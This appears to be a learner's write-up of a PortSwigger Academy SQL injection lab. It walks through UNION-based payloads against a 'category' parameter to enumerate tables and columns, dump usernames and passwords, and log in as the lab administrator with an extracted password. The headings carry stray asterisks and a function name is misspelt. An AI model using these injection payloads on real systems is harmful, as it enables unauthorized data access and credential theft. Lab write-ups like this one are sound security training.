---
slug: "ps-sqli-09"
title: "SQL injection UNION attack, retrieving data from other tables"
platform: "PortSwigger"
difficulty: "Medium"
category: ["Web","SQLi"]
date: "2025-12-14"
minutes: 4
visible: true
tldr: "- The vulnerable parameter was `category` in the product filtering functionality.\n- Supplying normal values such as `Pets` returned valid product list…"
format: "html"
---

<p class="mono lab-crumb">PORTSWIGGER ACADEMY // SQLi SERIES &middot; LAB 09 &middot; <a href="https://github.com/0xWalid/Learnings/tree/main/Portswiggers/01-Sql%20Injection%20Labs/09-%20SQL%20injection%20UNION%20attack%2C%20retrieving%20data%20from%20other%20tables.md" target="_blank" rel="noopener">original notes &#8599;</a></p>
<h2>1. Observation**</h2>
<ul><li>The vulnerable parameter was <strong><code>category</code></strong> in the product filtering functionality.</li><li>Supplying normal values such as <code>Pets</code> returned valid product listings.</li><li>Injecting a <strong>single quote (<code>'</code>)</strong> resulted in an <strong>Internal Server Error</strong>, confirming:</li><li>User input is directly concatenated into an SQL query.</li><li>The input is placed inside a quoted string.</li><li>This behavior confirmed the presence of <strong>SQL injection</strong>.</li><li>The objective of this lab was to <strong>retrieve data from other tables</strong> and verify access using the extracted credentials.</li></ul>
<h2>2. Hypothesis**</h2>
<p>Likely backend query structure:</p>
<pre class="code" data-lang="sql"><code>SELECT col1, col2
FROM products
WHERE category = '&lt;user_input&gt;';</code></pre>
<p><strong>Reasoning:</strong></p>
<ul><li>UNION-based SQL injection requires:</li><li>Matching the <strong>exact number of columns</strong></li><li>Ensuring <strong>datatype compatibility</strong></li><li>Once UNION is successful, it can be used to:</li><li>Query database metadata</li><li>Identify sensitive tables</li><li>Extract data</li></ul>
<h2>3. Tests (Experiments Conducted)**</h2>
<h2>Test 1 — Confirm SQL injection and column count**</h2>
<p><strong>Payload used:</strong></p>
<pre class="code" data-lang="sql"><code>Pets' UNION SELECT NULL,NULL--</code></pre>
<p><strong>Result:</strong></p>
<ul><li>Query executed without error.</li></ul>
<p><strong>Conclusion:</strong></p>
<p>✅ The original query returns <strong>2 columns</strong>.</p>
<h2>Test 2 — Identify database type**</h2>
<p>Support for standard SQL syntax and the availability of <code>VERSION()</code> confirmed that the backend database is <strong>PostgreSQL</strong>.</p>
<h2>Test 3 — Enumerate table names**</h2>
<p><strong>Payload used:</strong></p>
<pre class="code" data-lang="sql"><code>Pets' UNION SELECT table_name,'b'
FROM information_schema.tables--</code></pre>
<p><strong>Result:</strong></p>
<ul><li>A list of tables was returned.</li><li>A table named <strong><code>users</code></strong> was identified as a likely target for credential storage.</li></ul>
<h2>Test 4 — Enumerate columns of the users table**</h2>
<p><strong>Payload used:</strong></p>
<pre class="code" data-lang="sql"><code>Pets' UNION SELECT column_name,'b'
FROM information_schema.columns
WHERE table_name='users'--</code></pre>
<p><strong>Result:</strong></p>
<ul><li>Column names of the <code>users</code> table were displayed.</li><li>Identified relevant columns:</li><li><code>username</code></li><li><code>password</code></li></ul>
<h2>Test 5 — Extract user credentials**</h2>
<p><strong>Payload used:</strong></p>
<pre class="code" data-lang="sql"><code>Pets' UNION SELECT username,password
FROM users--</code></pre>
<p><strong>Result:</strong></p>
<ul><li>User credentials were successfully retrieved.</li><li>Administrator account identified:</li></ul>
<pre class="code" data-lang="sql"><code>Username: administrator
Password: lqqnda5h97wj2q7rws8p
</code></pre>
<h2>Test 6 — Verification**</h2>
<ul><li>The extracted credentials were used to log in via the application login page.</li><li>Authentication succeeded as the <strong>administrator</strong> user.</li><li>The application confirmed privileged access.</li><li>The lab displayed the <strong>“Lab Completed”</strong> message.</li></ul>
<h2>4. Result**</h2>
<h2>Final Working Payload**</h2>
<pre class="code" data-lang="sql"><code>Pets' UNION SELECT username,password FROM users--</code></pre>
<h2>Confirmed Facts**</h2>
<ul><li>Vulnerable parameter: <code>category</code></li><li>Number of columns: <strong>2</strong></li><li>Backend DBMS: <strong>PostgreSQL</strong></li><li>Metadata source: <code>information_schema</code>, <code>version()</code></li><li>Users table: <code>users</code></li><li>Credential columns: <code>username</code>, <code>password</code></li><li>Administrator credentials successfully extracted and verified</li><li>Lab successfully completed after authentication</li><li>Screenshot:</li></ul>
<p>&lt;img width="1178" height="221" alt="image" src="https://github.com/user-attachments/assets/a0a05fb1-4af6-4b08-a666-558ddd796001" /&gt;</p>
<h2>5. Learning (Key Takeaways)**</h2>
<ul><li>PostgreSQL can be identified with <code>verion(</code>).</li><li><code>NULL</code> is useful when matching column counts with unknown datatypes.</li><li>Credential tables often use common names such as <code>users</code>.</li><li>Verification through login confirms real‑world impact.</li></ul>
<h2>6. Future Notes**</h2>
<p>When solving <strong>“retrieving data from other tables”</strong> labs:</p>
<ul><li>Always confirm the column count first.</li><li>Identify the DBMS early to avoid syntax errors.</li><li>Use <code>information_schema.tables</code> to list tables.</li><li>Prioritize tables likely to contain authentication data.</li><li>Enumerate columns before attempting extraction.</li><li>Ensure UNION datatypes match.</li><li>Verify extracted credentials whenever possible.</li></ul>
<h2>7. Notes for My Future Self**</h2>
<ul><li>Do not skip enumeration steps.</li><li>Database identification dictates payload syntax , like in case of postgresql we used <code>version()</code></li><li><code>information_schema</code> is essential for PostgreSQL.</li><li>Always validate impact by logging in if allowed.</li><li>Save both payloads and proof of completion.</li><li>Clear documentation helps rebuild understanding quickly.</li></ul>

<details class="flag-box"><summary><span class="flag-label">LAB STATUS</span><span class="flag-hint"></span></summary><code>SQLi SERIES :: LAB 09 COMPLETE</code></details>
